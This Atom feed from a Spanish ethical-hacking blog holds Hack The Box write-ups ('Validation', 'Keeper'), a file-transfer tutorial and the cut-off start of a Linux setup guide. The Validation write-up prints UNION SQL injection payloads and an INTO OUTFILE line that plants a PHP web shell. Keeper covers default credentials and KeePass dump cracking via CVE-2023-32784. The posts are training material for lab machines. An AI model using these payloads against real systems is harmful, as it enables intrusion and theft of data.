<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-04-12T18:41:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RuyzTzt7 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Álvaro Ruiz Gutiérrez</name></author><entry><title type="html">WriteUp HTB - Máquina validation</title><link href="http://localhost:4000/writeup-validation/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina validation" /><published>2025-04-12T00:00:00+02:00</published><updated>2025-04-12T00:00:00+02:00</updated><id>http://localhost:4000/writeup-validation</id><content type="html" xml:base="http://localhost:4000/writeup-validation/"><![CDATA[<p align="center">
  <img src="/assets/images/htb/validation/burp.png" alt="Validation" width="2200" />
</p>

<hr />

<h2 id="explotación-sqli">Explotación SQLI.</h2>

<p>Vemos en primer lugar que nos enfrentamos ante un panel donde no se acontece ningun login. Solo un post donde te creas un usuario al acceder.</p>

<p align="center">
  <img src="/assets/images/htb/validation/web.png" alt="1" width="2200" />
</p>

<p>Probamos a alterar el campo de país con Burpsuite para ver si se acontece algún fallo en la web.</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp1.png" alt="2" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp2.png" alt="3" width="2200" />
</p>

<p>Como falla, podemos intuir que es vulnerable a SQLI, además vemos que se interpreta código php y que es un servidor apache alojado en la ruta del sistema /var/www/html.</p>

<p>Ahora probaremos a lanzar un:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">order</span> <span class="n">by</span> <span class="mi">100</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>para probar listar un ordenamiento de los datos basados en la columna número 100. En caso de responderte el mismo error en vez de alguno que te indique que se desconoce los datos de esa columna, podremos ir inyectando código con un</p>

<ul>
  <li><strong>Comando:</strong></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="mf">....</span> <span class="o">--</span> <span class="o">-</span>

</code></pre></div></div>

<p align="center">
  <img src="/assets/images/htb/validation/burp3.png" alt="4" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp4.png" alt="5" width="2200" />
</p>

<p>Probaremos a listar las base de datos existentes:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">database</span><span class="p">()</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp5.png" alt="6" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp6.png" alt="7" width="2200" />
</p>

<p>Vemos que la bd se llama registration.</p>

<p>Para listar el nombre de todas las base de datos:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">schema_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">schemata</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp7.png" alt="8" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp8.png" alt="9" width="2200" />
</p>

<p>Para listar las tablas que contiene la base de datos registration probamos con:</p>

<ul>
  <li>
    <p><strong>Comando:</strong></p>

    <p>’ union SELECT table_name from information_schema.tables where table_schema=”registration”– -
```</p>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp9.png" alt="10" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp10.png" alt="11" width="2200" />
</p>

<p>Para listar las columnas de la tabla que queramos probamos con:</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">column_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"registration"</span> <span class="k">and</span> <span class="n">table_name</span><span class="o">=</span><span class="s2">"registration"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp11.png" alt="12" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp12.png" alt="13" width="2200" />
</p>

<p>Para listar el contenido de las dos entidades username y userhash, jugamos con group_concat para listar la info correspondiente de la tabla registration</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="n">userhash</span><span class="p">)</span> <span class="n">from</span> <span class="n">registration</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>0x3a = ;</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp13.png" alt="14" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp14.png" alt="16" width="2200" />
</p>

<p>No vemos información relevante ya que en los hashes no hay ninguna password por la naturaleza de la web, por lo que intentaremos interpretar código php interpretando el fichero en la ruta del sistema que la que suponemos que se almacena.</p>

<ul>
  <li><strong>Comando:</strong>
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="s2">"Esto es una prueba"</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">"/var/www/html/prueba.txt"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div>    </div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/validation/burp15.png" alt="17" width="2200" />
</p>
<p>Vemos como nos lo interpreta y se almacena el el sistema, por lo que intentaremos de mandar código php para poder ejecturar comandos</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp16.png" alt="18" width="2200" />
</p>

<ul>
  <li><strong>Comando:</strong></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union SELECT "<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>" into outfile "/var/www/html/prueba.php"-- -
</code></pre></div></div>

<p align="center">
  <img src="/assets/images/htb/validation/burp17.png" alt="19" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp18.png" alt="20" width="2200" />
</p>

<p>Vemos que funciona desde la web, por lo que le pasaremos en oneliner para entablar una reverse shell a nuestro equipo encodeando a url la petición para que se interprete.</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp19.png" alt="21" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp20.png" alt="22" width="2200" />
</p>

<p align="center">
  <img src="/assets/images/htb/validation/burp21.png" alt="23" width="2200" />
</p>

<hr />]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="HTB" /><category term="WriteUp" /><category term="eJPT" /><category term="SQLI" /><category term="Linux" /><category term="Fácil" /><category term="eJPT" /><category term="MySQL" /><summary type="html"><![CDATA[En este artículo, resolveremos la máquina Validation de la plataforma HTB.]]></summary></entry><entry><title type="html">WriteUp HTB - Máquina Keeper</title><link href="http://localhost:4000/writeup-keeper/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina Keeper" /><published>2025-04-07T00:00:00+02:00</published><updated>2025-04-07T00:00:00+02:00</updated><id>http://localhost:4000/writeup-keeper</id><content type="html" xml:base="http://localhost:4000/writeup-keeper/"><![CDATA[<p align="center">
  <img src="/assets/images/htb/keeper/logo2.png" alt="Beep" width="2200" />
</p>

<blockquote>
  <h1 id="ip-keeper-1012922941">IP Keeper: 10.129.229.41</h1>
  <h1 id="ip-local-10101610">IP Local: 10.10.16.10</h1>
</blockquote>

<h2 id="1-enumeración-de-puertos-de-la-máquina">1. Enumeración de Puertos de la Máquina</h2>

<p>Primeramente comprobamos que tenemos acceso a la máquina Keeper con una traza ICMP de un paquete. 
Además la conexión, nos permite identificar por el valor TTL (Time to alive), 
si nos enfrentamos a una máquina Linux(TTL -&gt; 64) o Windows( -&gt; 128)</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ping -c 1 10.129.229.41</code></pre>
</div>
  </li>
</ul>

<p>En HTB, se aprecia que el TTL es una unidad menor. Para visualizar la ruta completa de la conexión y comprobar que existe un nodo intermediario entre el atacante y la víctima, se utiliza la flag <strong>-R</strong>:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ping -c 1 10.129.229.41 -R</code></pre>
</div>
  </li>
</ul>

<p>A continuación, se crea un directorio de trabajo en el escritorio, nombrándolo según la máquina:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>mkdir Keeper</code></pre>
</div>
  </li>
</ul>

<p>Para organizar el ataque, se utiliza una función personalizada llamada <strong>mkt</strong> (definida en el archivo .zshrc) que crea tres carpetas: <code class="language-plaintext highlighter-rouge">nmap</code>, <code class="language-plaintext highlighter-rouge">content</code> y <code class="language-plaintext highlighter-rouge">exploits</code>.</p>

<ul>
  <li><strong>Función:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>mkt () {
mkdir {nmap,content,exploits}
}</code></pre>
</div>
  </li>
</ul>

<p>Dentro de la carpeta <strong>nmap</strong>, se procede a enumerar los puertos abiertos entre los 65,535 disponibles:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.41 -oG allPorts</code></pre>
</div>

    <ul>
      <li><strong>-p-:</strong> Escanea todo el rango de puertos.</li>
      <li><strong>–open:</strong> Muestra solo los puertos abiertos.</li>
      <li><strong>-sS:</strong> Realiza un TCP SYN Scan.</li>
      <li><strong>–min-rate 5000:</strong> Aumenta la velocidad del escaneo (más de 5000 paquetes por segundo).</li>
      <li><strong>-vvv:</strong> Modo triple verbose para mayor detalle.</li>
      <li><strong>-n:</strong> Omite la resolución DNS.</li>
      <li><strong>-Pn:</strong> Asume que el host está activo.</li>
      <li><strong>-oG:</strong> Exporta los resultados en formato grepeable, facilitando el filtrado posterior.</li>
    </ul>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/keeper/nmap1.png" alt="Nmap" width="800" />
</p>

<p>Una vez concluido el escaneo de puertos, se utiliza una herramienta personalizada llamada <strong>extractPorts</strong> (definida en el .zshrc) para copiar los puertos relevantes al portapapeles y proceder a la enumeración de servicios.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/target.png" alt="ExtractPorts" width="900" />
</p>

<hr />

<h2 id="2-enumeración-de-servicios-de-los-puertos">2. Enumeración de Servicios de los Puertos</h2>

<p>Con la lista de puertos obtenida, se procede a identificar los servicios que corren en ellos. Esto permite conocer las versiones y configuraciones, facilitando la detección de posibles vulnerabilidades.</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>nmap -sCV -p22,80 -oN targeted</code></pre>
</div>

    <ul>
      <li><strong>-sC:</strong> Ejecuta scripts básicos de reconocimiento.</li>
      <li><strong>-sV:</strong> Detecta versiones y servicios.</li>
      <li><strong>-oN:</strong> Exporta los resultados en un formato normal.</li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="3-análisis-de-servicios">3. Análisis de Servicios</h2>

<p>Durante esta etapa se observa que el puerto 80 y 22 estan expuestos. Se procede a examinar la web mediante un navegador y, utilizando la extensión <strong>Wappalyzer</strong> de Firefox, se identifican las tecnologías empleadas.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/vhost.png" alt="Virtual Hosting" width="2500" />
</p>

<p>Al acceder a la web se produce un host discovery por lo que tendremos que añadir al /etc/hosts el dominio. Y vemos como al hacer ping al dominio, se nos resuelve el comando.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/hosts.png" alt="Hosts" width="2500" />
</p>

<p>Finalmente, se revela un panel de login de Request Tracker:</p>

<p align="center">
  <img src="/assets/images/htb/keeper/login.png" alt="Login" width="2300" />
</p>

<hr />

<h2 id="4-identificación-de-vulnerabilidades">4. Identificación de Vulnerabilidades</h2>

<p>Se prueba inicialmente el acceso al panel utilizando las contraseñas por defecto, con éxito.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/pass.png" alt="Password 1" width="2500" />
</p>

<p>Se detecta que hay un leak de información en el apartado de usuario donde vemos un usuario potencial y un comentario de cambio de contraseña con esta expuesta. Por lo que tratamos de conectarnos por ssh y entramos en la máquina víctima con el usuario encontrado.</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ssh user@10.129.229.41</code></pre>
</div>
  </li>
</ul>

<p>Posteriormente, encontramos un zip que contiene un keepass y un volcado de un dumpeo de la base de datos del keepass.Por lo que para extraerlo y verlo en mi máquina, uso netcat para traerme el ficher.zip.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/ziplon.png" alt="zip" width="2500" />
</p>

<p>Nota: Usando md5sum podemos spamearlo sobre el fichero que estamos extrayendo para que cuando el contenido sea estático saber que ha concluido la extracción.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/md5.png" alt="md5" width="2500" />
</p>

<p>A priori, abrimos el keepas con keepassxc y vemos que nos pide la contraseña maestra. Para ello debemos de investigar sobre el dumpeo que se nos proporciona, y en ese binario con extensión .dmp existe una vulnerabilidad registrada como <strong>CVE-2023-32784</strong></p>

<p align="center">
  <img src="/assets/images/htb/keeper/keepass.png" alt="Keepass Login" width="2500" />
</p>

<hr />

<h2 id="5-explotación-de-vulnerabilidades">5. Explotación de Vulnerabilidades</h2>

<h3 id="análisis-y-explotación-de-cve-2023-32784">Análisis y Explotación de CVE-2023-32784</h3>

<p>Se identifica la vulnerabilidad, y tras horas investigando, encontré un script en python para extraer posibles contraseñas almcenadas en el binario.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/exploit.png" alt="Exploit" width="2500" />
</p>

<p>Tras tener una lista de posibles contraseñas, vemos que se encuentras algunos caracteres codificados, al copiar y pegar en google vemos que son letras noruegas. Probamos dicha contraseña en el gestor de contraseñas y accedemos.</p>

<p align="center">
  <img src="/assets/images/htb/keeper/password.png" alt="Chrome Noruego" width="2500" />
</p>

<p align="center">
  <img src="/assets/images/htb/keeper/kepasword.png" alt="KeePass PAssword" width="2500" />
</p>

<p>Dentro del keepass, vemos la contraseña del usuario root, la cual no funcionaba ni el la web ni por ssh. En las notas había una clave privada pero en formato PuTTY <strong>.ppk</strong>.</p>
<p align="center">
  <img src="/assets/images/htb/keeper/putty.png" alt="Credenciales root" width="2500" />
</p>

<p>Nos copiamos el contenido en neustro equipo para trabajar sobre este.</p>
<p align="center">
  <img src="/assets/images/htb/keeper/fileppk.png" alt="File .ppk" width="2500" />
</p>

<p>Usamos la herramiento de puttygen para convertirlo a RSA <strong>.pem</strong> que estamos acostumbrado a usar.</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo apt-get install putty-tools</code></pre>
</div>
  </li>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>puttygen key.ppk -O private-openssh -o key.pem
</code></pre>
</div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/keeper/id_rsa.png" alt="File .pem" width="2500" />
</p>

<p>Una vez Obtenido la clave privada, le damos el permiso 600</p>
<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>chmod 600 key.pem</code></pre>
</div>
  </li>
</ul>

<p>Y con el parámetro  -i nos conectamos por ssh.</p>
<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ssh -i key.pem root@10.129.229.41</code></pre>
</div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/keeper/pwnd.png" alt="File .pem" width="2500" />
</p>

<p>Así conseguimos ganar acceso a la máquina y directamente como el usuario root.</p>]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="HTB" /><category term="WriteUp" /><category term="eJPT" /><category term="CVE-2023-32784" /><category term="Request Tracker" /><category term="Information Leakage" /><category term="KeePass .kdbx" /><category term="Putty" /><category term="Extensión .ppk" /><category term="Clave Privada" /><category term="RSA" /><category term="Linux" /><category term="Fácil" /><category term="eJPT" /><summary type="html"><![CDATA[En este artículo, resolveremos la máquina Keeper de la plataforma HTB.]]></summary></entry><entry><title type="html">Transferencia de Archivos entre Parrot y Windows</title><link href="http://localhost:4000/compartir-archivos-a-nivel-de-red/" rel="alternate" type="text/html" title="Transferencia de Archivos entre Parrot y Windows" /><published>2025-04-03T00:00:00+02:00</published><updated>2025-04-03T00:00:00+02:00</updated><id>http://localhost:4000/compartir-archivos-a-nivel-de-red</id><content type="html" xml:base="http://localhost:4000/compartir-archivos-a-nivel-de-red/"><![CDATA[<h1 id="transferencia-de-archivos-entre-parrot-y-windows">Transferencia de Archivos entre Parrot y Windows</h1>

<p>Este artículo describe cómo transferir archivos entre <strong>Parrot OS</strong> y <strong>Windows</strong> en una red local utilizando distintos métodos: SMB con <code class="language-plaintext highlighter-rouge">impacket</code>, montaje de carpetas compartidas con <code class="language-plaintext highlighter-rouge">CIFS</code>, y un servidor HTTP básico con <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<hr />

<h2 id="1-transferir-un-archivo-de-windows-a-parrot">1. Transferir un archivo de Windows a Parrot</h2>

<h3 id="configuración-en-parrot">Configuración en Parrot</h3>

<ol>
  <li>Accede a la carpeta que deseas compartir:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>cd ~/ruta/de/la/carpeta</code></pre>
</div>

<ol>
  <li>Eleva permisos a root:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>sudo su</code></pre>
</div>

<ol>
  <li>Inicia un servidor SMB con <code class="language-plaintext highlighter-rouge">impacket</code>:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>impacket-smbserver smbFolder $(pwd) -smb2support -username alvaro -password alvaro123</code></pre>
</div>

<hr />

<h3 id="conexión-desde-windows">Conexión desde Windows</h3>

<ol>
  <li>
    <p>Abre <code class="language-plaintext highlighter-rouge">cmd</code>.</p>
  </li>
  <li>
    <p>Conecta la carpeta compartida:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>net use L: \\192.168.1.251\smbFolder /user:alvaro alvaro123</code></pre>
</div>

<ol>
  <li>Copia un archivo desde Windows:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>copy "C:\Users\alvar\Pictures\Joker.jpg" L:\</code></pre>
</div>

<ol>
  <li>
    <p>Verifica en Parrot que se haya copiado correctamente.</p>
  </li>
  <li>
    <p>Desconecta la unidad de red:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>net use L: /delete</code></pre>
</div>

<hr />

<h2 id="2-transferir-un-archivo-de-parrot-a-windows">2. Transferir un archivo de Parrot a Windows</h2>

<h3 id="configuración-en-windows">Configuración en Windows</h3>

<ol>
  <li>
    <p>Crea una carpeta compartida (ej: <code class="language-plaintext highlighter-rouge">C:\SharedFolder</code>).</p>
  </li>
  <li>
    <p>Haz clic derecho → Propiedades → Compartir → Asigna un nombre (ej: <code class="language-plaintext highlighter-rouge">sharedFolder</code>) y otorga permisos de lectura/escritura.</p>
  </li>
  <li>
    <p>Obtén la IP del equipo:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>ipconfig</code></pre>
</div>

<hr />

<h3 id="conexión-desde-parrot">Conexión desde Parrot</h3>

<ol>
  <li>(Opcional) Crea una carpeta de montaje:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>mkdir /mnt/windowsShare</code></pre>
</div>

<ol>
  <li>Monta la carpeta de Windows:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>sudo mount -t cifs -o username=alvaro,password=alvaro123 //192.168.1.100/sharedFolder /mnt/windowsShare</code></pre>
</div>

<ol>
  <li>Copia el archivo desde Parrot:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>cp /ruta/archivoParrot /mnt/windowsShare/</code></pre>
</div>

<ol>
  <li>
    <p>Verifica desde Windows que el archivo se ha copiado.</p>
  </li>
  <li>
    <p>Desmonta la unidad:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>sudo umount /mnt/windowsShare</code></pre>
</div>

<hr />

<h2 id="3-transferencia-rápida-con-servidor-http-en-windows">3. Transferencia rápida con servidor HTTP en Windows</h2>

<p>Una forma simple y sin configuraciones complejas. Ideal para pasar archivos puntuales.</p>

<h3 id="iniciar-servidor-http-en-windows">Iniciar servidor HTTP en Windows</h3>

<ol>
  <li>
    <p>Abre una terminal en la carpeta con los archivos a compartir.</p>
  </li>
  <li>
    <p>Lanza el servidor HTTP:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>python -m http.server 80</code></pre>
</div>

<ol>
  <li>Obtén la IP de Windows con:</li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>ipconfig</code></pre>
</div>

<hr />

<h3 id="descargar-archivos-desde-parrot">Descargar archivos desde Parrot</h3>

<p>Usa <code class="language-plaintext highlighter-rouge">wget</code>:</p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>wget http://192.168.1.100:8000/archivo.txt</code></pre>
</div>

<p>O <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>curl -O http://192.168.1.100:8000/archivo.txt</code></pre>
</div>

<hr />

<h3 id="3-transferencia-rápida-con-servidor-http-en-linux">3. Transferencia rápida con servidor HTTP en Linux</h3>

<ol>
  <li>
    <p>En Parrot, entra en la carpeta a compartir.</p>
  </li>
  <li>
    <p>Lanza el servidor:</p>
  </li>
</ol>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', monospace; font-size: 14px;">
<pre style="margin: 0;"><code>python3 -m http.server 8000</code></pre>
</div>

<ol>
  <li>Desde Windows, abre el navegador y accede a:</li>
</ol>

<p>http://IP-DE-PARROT:8000</p>

<p>Y descarga desde el navegador.</p>]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="Redes" /><category term="Linux" /><category term="Parrot OS" /><category term="Windows" /><category term="SMB" /><category term="Impacket" /><category term="Python" /><category term="Compartir Archivos" /><summary type="html"><![CDATA[Aprende a compartir archivos entre Parrot OS y Windows a través de red local usando SMB, o un servidor HTTP simple con Python.]]></summary></entry><entry><title type="html">Cómo personalizar tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo personalizar tu propio sistema Linux" /><published>2025-04-02T00:00:00+02:00</published><updated>2025-04-02T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/"><![CDATA[<p align="center">
  <img src="/assets/images/ruyztz/ruyzIOS.png" alt="RuyzTzOS" width="600" />
</p>

<h2 id="índice-y-estructura-principal">Índice y Estructura Principal</h2>

<ul>
  <li><a href="#instalación-del-sistema-operativo">Instalación del Sistema Operativo</a>
    <ul>
      <li><a href="#instalación-de-software-de-virtualización">Instalación de Software de Virtualización</a></li>
      <li><a href="#configuración-de-la-máquina-virtual-en-vmware">Configuración de la Máquina Virtual en VMware</a></li>
      <li><a href="#instalación-del-sistema-operativo-en-la-máquina-virtual">Instalación del Sistema Operativo en la Máquina Virtual</a></li>
      <li><a href="#configuración-inicial">Configuración Inicial</a></li>
    </ul>
  </li>
  <li><a href="#instalación-y-configuración-de-bspwm-y-sxhkd">Instalación y Configuración de BSPWM y SXHKD</a>
    <ul>
      <li><a href="#instalación-de-dependencias">Instalación de Dependencias</a></li>
      <li><a href="#instalación-de-bspwm-y-sxhkd">Instalación de BSPWM y SXHKD</a></li>
    </ul>
  </li>
  <li><a href="#instalación-y-configuración-de-kitty">Instalación y Configuración de Kitty</a>
    <ul>
      <li><a href="#modificaciones-en-el-archivo-sxhkdrc">Modificaciones en el Archivo sxhkdrc</a></li>
      <li><a href="#creación-del-script-de-redimensionado">Creación del Script de Redimensionado</a></li>
    </ul>
  </li>
  <li><a href="#instalación-y-configuración-de-polybar-picom-y-rofi">Instalación y Configuración de Polybar, Picom y Rofi</a>
    <ul>
      <li><a href="#instalación-de-polybar">Instalación de Polybar</a></li>
      <li><a href="#instalación-de-picom">Instalación de Picom</a></li>
      <li><a href="#instalación-de-rofi">Instalación de Rofi</a></li>
      <li><a href="#configuración-en-sxhkdrc">Configuración en sxhkdrc</a></li>
      <li><a href="#prueba-del-entorno">Prueba del Entorno</a></li>
    </ul>
  </li>
  <li><a href="#instalación-y-configuración-de-fuentes-kitty-y-feh">Instalación y Configuración de Fuentes, Kitty y Feh</a>
    <ul>
      <li><a href="#instalación-de-fuentes-nerd">Instalación de Fuentes Nerd</a></li>
      <li><a href="#instalación-de-kitty">Instalación de Kitty</a></li>
      <li><a href="#configuración-de-kitty">Configuración de Kitty</a></li>
      <li><a href="#instalación-y-configuración-de-feh">Instalación y Configuración de Feh</a></li>
      <li><a href="#configuración-de-z-shell-zsh">Configuración de Z Shell (Zsh)</a></li>
